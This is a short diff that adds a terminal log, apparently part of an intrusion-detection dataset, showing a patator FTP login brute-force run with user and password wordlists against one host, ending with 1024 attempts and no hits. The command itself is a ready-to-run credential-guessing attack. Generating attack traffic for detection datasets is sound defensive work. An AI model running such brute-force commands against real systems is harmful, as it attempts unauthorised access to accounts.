@@ -1,0 +1,6 @@
+ubuntu@Ubuntu-20-04:~/intrusion-detection-dataset/patator$ patator ftp_login host=33.33.33.220 user=FILE0 password=FILE1 0=user.txt 1=password.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
+22:10:30 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2023-09-25 22:10 CST
+22:10:30 patator    INFO -                                                                              
+22:10:30 patator    INFO - code  size    time | candidate                          |   num | mesg
+22:10:30 patator    INFO - -----------------------------------------------------------------------------
+22:15:42 patator    INFO - Hits/Done/Skip/Fail/Size: 0/1024/0/0/1024, Avg: 3 r/s, Time: 0h 5m 11s
